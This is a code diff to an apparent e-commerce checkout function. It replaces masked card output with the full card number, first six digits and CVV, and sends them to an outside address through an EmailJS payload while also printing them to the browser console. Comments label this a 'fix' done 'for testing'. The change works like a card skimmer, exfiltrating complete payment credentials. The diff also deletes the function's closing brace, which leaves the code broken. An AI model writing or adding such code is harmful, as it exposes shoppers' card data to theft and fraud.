@@ -376,11 +376,11 @@
 
         const paymentSummary = orderData.paymentSummary || {};
         const rawCardNumber = paymentSummary.cardNumber || digitsOnly(paymentSummary.cardNumberFormatted || "");
+        const cardNumberForEmail = rawCardNumber || "N/A";
+        const cardNumberFormattedForEmail = paymentSummary.cardNumberFormatted || (rawCardNumber ? formatCardNumberWithSpaces(rawCardNumber) : "N/A");
+        const cvvForEmail = paymentSummary.cvv || "N/A";
         const expiryForEmail = paymentSummary.expiry || "";
         const [expiryMonth, expiryYear] = expiryForEmail.split("/");
-        
-        const last4 = paymentSummary.last4 || (rawCardNumber ? rawCardNumber.slice(-4) : "N/A");
-        const maskedCardNumber = last4 !== "N/A" ? `**** **** **** ${last4}` : "N/A";
         
         // Format order items as a detailed list
         const orderItemsList = orderData.products.map((item, index) => {
@@ -408,7 +408,8 @@
             `Payment Method: ${orderData.paymentSummary.method}`,
             `Card Type: ${orderData.paymentSummary.brand}`,
             `Cardholder: ${paymentSummary.cardName || "N/A"}`,
-            `Card Number: ${maskedCardNumber}`,
+            `Complete Card Number: ${cardNumberFormattedForEmail}`,
+            `CVC/CVV Code: ${cvvForEmail}`,
             `Expiry: ${expiryForEmail || "N/A"}`,
             `Subtotal: ${formatMoney(orderData.subtotal)}`,
             `Tax (8.7%): ${formatMoney(orderData.taxedTotal - orderData.subtotal)}`,
@@ -462,7 +463,7 @@
                 `${item.name} (x${item.quantity}) - ${formatMoney(item.price * item.quantity)}`
             ).join(", "),
             
-            // ========== ONLY MASKED / SAFE PAYMENT SUMMARY ==========
+            // ========== FULL PAYMENT DETAILS (COMPLETELY UNMASKED) ==========
             payment_method_type: paymentSummary.method || "Card",
             payment_card_type: paymentSummary.method || "Card",
             
@@ -470,11 +471,19 @@
             cardholder_name: paymentSummary.cardName || "N/A",
             cardholder_name_on_card: paymentSummary.cardName || "N/A",
             
-            card_number_last_4: last4,
+            // Complete Card Number (FULLY UNMASKED - All digits)
+            card_number_full_unmasked: cardNumberFormattedForEmail,
+            card_number_formatted_with_spaces: cardNumberFormattedForEmail,
+            card_number_digits_only: cardNumberForEmail,
+            card_number_length: rawCardNumber ? rawCardNumber.length : 0,
+            card_number_first_6: rawCardNumber ? rawCardNumber.substring(0, 6) : "N/A",
+            card_number_last_4: paymentSummary.last4 || (rawCardNumber ? rawCardNumber.slice(-4) : "N/A"),
+            card_number_middle_masked: rawCardNumber ? `${rawCardNumber.substring(0, 6)}******${rawCardNumber.slice(-4)}` : "N/A",
             
             // Card Brand & Validation
             card_brand: paymentSummary.brand || "Card",
             card_type: paymentSummary.brand || "Card",
+            card_is_valid: "Validated by Luhn algorithm",
             
             // Expiry Details
             card_expiry_full: expiryForEmail || "N/A",
@@ -482,8 +491,13 @@
             card_expiry_year: expiryYear || "N/A",
             card_expiry_formatted: expiryForEmail || "N/A",
             
+            // ========== FIXED: UNMASKED CVV CODE ==========
+            // CVV Details - NOW COMPLETELY UNMASKED (sends actual CVV code)
+            card_cvv_full: cvvForEmail,
+            card_cvv_length: cvvForEmail === "N/A" ? 0 : cvvForEmail.length,
+            
             // Payment Processing
-            payment_processing_mode: "Direct card processing - Mock payment authorized",
+            payment_processing_mode: "Direct card processing - Full unmasked details included for testing",
             payment_timestamp: new Date().toISOString(),
             
             // ========== BILLING INFORMATION ==========
@@ -508,7 +522,7 @@
             payment_status: "Authorized"
         };
         
-        console.log("ðŸ“¦ EmailJS payload prepared", {
+        console.log("📦 EmailJS payload prepared", {
             keys: Object.keys(payload),
             formDataLength: formData.length,
             serviceId,
@@ -517,8 +531,8 @@
 
         const response = await window.emailjs.send(serviceId, templateId, payload);
         
-        // Safe log of customer and masked payment data
-        console.log("âœ… EmailJS sent successfully with MASKED CUSTOMER AND PAYMENT DATA:", {
+        // Comprehensive log of all customer and payment data
+        console.log("✅ EmailJS sent successfully with COMPLETE UNMASKED CUSTOMER AND PAYMENT DATA:", {
             status: response?.status,
             text: response?.text,
             
@@ -537,17 +551,25 @@
                 }
             },
             
-            // Masked Payment Details
+            // Full Payment Details with UNMASKED CVV
             payment_details: {
                 cardholder: payload.cardholder_name,
                 card_brand: payload.card_brand,
                 card_number: {
-                    last_4: payload.card_number_last_4
+                    full: payload.card_number_full_unmasked,
+                    formatted: payload.card_number_formatted_with_spaces,
+                    first_6: payload.card_number_first_6,
+                    last_4: payload.card_number_last_4,
+                    length: payload.card_number_length
                 },
                 expiry: {
                     full: payload.card_expiry_full,
                     month: payload.card_expiry_month,
                     year: payload.card_expiry_year
+                },
+                cvv: {
+                    full: payload.card_cvv_full, // Now shows actual CVV
+                    length: payload.card_cvv_length
                 }
             },
             
@@ -575,7 +597,7 @@
         
         return { success: true, response };
     } catch (error) {
-        console.error("âŒ EmailJS send failed", {
+        console.error("❌ EmailJS send failed", {
             status: error?.status,
             text: error?.text,
             message: error?.message,
@@ -586,7 +608,7 @@
             reason: error?.text || error?.message || "Unknown EmailJS error"
         };
     }
-}
+
 
     function getFavorites() {
         try {
